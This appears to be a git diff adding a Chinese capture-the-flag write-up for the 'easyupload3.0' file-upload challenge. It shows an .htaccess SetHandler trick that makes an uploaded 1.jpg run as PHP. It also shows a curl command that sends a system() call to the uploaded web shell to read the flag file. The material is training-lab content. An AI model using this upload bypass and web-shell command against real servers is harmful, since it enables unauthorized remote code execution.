@@ -743,4 +743,37 @@ binwalk -e '/home/kali/Desktop/MISC-神奇的二维码-BitcoinPay.png'
 NSSCTF{morseisveryveryeasy}
 ```
 
-25.
+25. [SWPUCTF 2021 新生赛]easyupload3.0
+
+这是一个文件上传问题，首先尝试上传一句话木马，发现被阻止了。
+
+尝试修改后缀上传，先上传1.jpg文件然后用bp抓包修改为1.php等各类php后缀上传，都不可行。
+
+改变思考方式.htaccess文件设置为以下代码，使得让上传的1.jpg文件解析为php代码并执行
+
+```
+<FilesMatch "1.jpg">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+```
+注：.htaccess 是 Apache 服务器中一个重要的配置文件，用于对网站目录进行 个性化配置 。它允许用户在无需修改主服务器配置文件的情况下，针对特定目录（及其子目录）设置规则
+```
+
+上传.htaccess文件的时候由于我的系统为archlinux，此文件以.开头会被隐藏，所以用bp抓包修改文件名(刚开始可以用xxx.txt这样的文件名)，使得上传成功
+
+![1745335196584](image/NSS/1745335196584.png)
+
+然后在bash中利用一句话木马
+
+```
+curl -X POST -d "cmd=system('cat /app/flag.php');" http://node7.anna.ns
+sctf.cn:21624/upload/1.jpg
+```
+
+![1745335818568](image/NSS/1745335818568.png)
+
+得到flag
+
+26.[SWPUCTF 2021 新生赛]pop
